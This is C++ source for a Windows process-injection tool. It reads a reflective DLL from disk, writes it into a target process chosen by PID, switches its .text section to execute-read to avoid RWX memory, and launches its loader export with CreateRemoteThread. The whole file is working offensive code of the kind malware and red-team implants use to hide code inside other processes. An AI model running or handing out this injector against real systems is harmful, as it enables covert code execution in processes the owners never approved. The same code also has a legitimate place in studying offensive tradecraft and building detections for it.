#include <Windows.h>
#include <stdio.h>

#include "GetProcOffset.hpp"


void main(int argc, char* argv[]) {
	if (argc < 3) {
		printf("[-] Usage : %s <pid> <Reflective DLL path>", argv[0]);
		return;
	}

	// Read DLL content into memory
	LPVOID dllContent = NULL;

	HANDLE hFile = ::CreateFileA(argv[2], GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL) {
		printf("[-] Unable to open \"%s\"\n", argv[2]);
		return;
	}
	DWORD size = ::GetFileSize(hFile, NULL);
	if (size == INVALID_FILE_SIZE) {
		printf("[-] Invalid file size.\n");
		return;
	}
	//dllContent = ::VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	dllContent = ::VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (dllContent == NULL) {
		printf("[-] Unable to allocate memory.\n");
		return;
	}
	DWORD sizeRead;
	if (!::ReadFile(hFile, dllContent, size, &sizeRead, NULL)) {
		printf("[-] Unable to read file.\n");
		return;
	}
	::CloseHandle(hFile);

	// Parse exports of DLL and find Raw Offset to Reflective Loading code export
	CHAR exportName[] = "Reflect";
	DWORD procOffset = GetProcOffset(dllContent, exportName);
	if (procOffset == 0) {
		printf("[-] \"%s\" export not found.\n", exportName);
		return;
	}

	/*
	// For debugging
	HANDLE hThread = ::CreateThread(0, 0, (LPTHREAD_START_ROUTINE)((DWORD64)dllContent + procOffset), 0, 0, 0);
	if (hThread == NULL) {
		printf("[-] Unable to create remote thread.\n");
		return;
	}
	::Sleep(10000);
	*/

	// Open handle to required process to inject DLL data
	DWORD pid = atoi(argv[1]);
	HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL) {
		printf("[-] Unable to open process.\n");
		return;
	}

	// Inject DLL data in remote process and create a thread to the Reflective Loading code export Raw Offset
	//LPVOID lpBuf = ::VirtualAllocEx(hProcess, 0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	LPVOID lpBuf = ::VirtualAllocEx(hProcess, 0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpBuf == NULL) {
		printf("[-] Unable to allocate memory in remote process.\n");
		return;
	}
	if (!::WriteProcessMemory(hProcess, lpBuf, dllContent, size, NULL)) {
		printf("[-] Unable to write to remote process.\n");
		return;
	}
	// Fix .text section memory to RX where export is present
	IMAGE_NT_HEADERS* pNTHdr = (IMAGE_NT_HEADERS*)((DWORD64)dllContent + ((IMAGE_DOS_HEADER*)dllContent)->e_lfanew);
	WORD OptHdrSize = pNTHdr->FileHeader.SizeOfOptionalHeader;
	IMAGE_SECTION_HEADER* pSectionTable = (IMAGE_SECTION_HEADER*)((DWORD64)&pNTHdr->OptionalHeader + OptHdrSize);
	DWORD SectionCount = pNTHdr->FileHeader.NumberOfSections;
	for (int i = 0; i < SectionCount; i++) {
		if (!strcmp((CHAR*)pSectionTable[i].Name, ".text")) {
			// printf("Name : %s\n", pSectionTable[i].Name);
			DWORD64 start = (DWORD64)lpBuf + RVA2Offset(pSectionTable[i].VirtualAddress, dllContent);
			DWORD size = pSectionTable[i].SizeOfRawData;
			DWORD old = 0;
			::VirtualProtectEx(hProcess, (LPVOID)start, size, PAGE_EXECUTE_READ, &old);
			break;
		}
	}
	HANDLE hThread = ::CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)((DWORD64)lpBuf+procOffset), 0, 0, 0);
	if (hThread == NULL) {
		printf("[-] Unable to create remote thread.\n");
		return;
	}

	::CloseHandle(hThread);
	::CloseHandle(hProcess);
	::VirtualFree(dllContent, size, MEM_DECOMMIT | MEM_RELEASE);

	return;
}
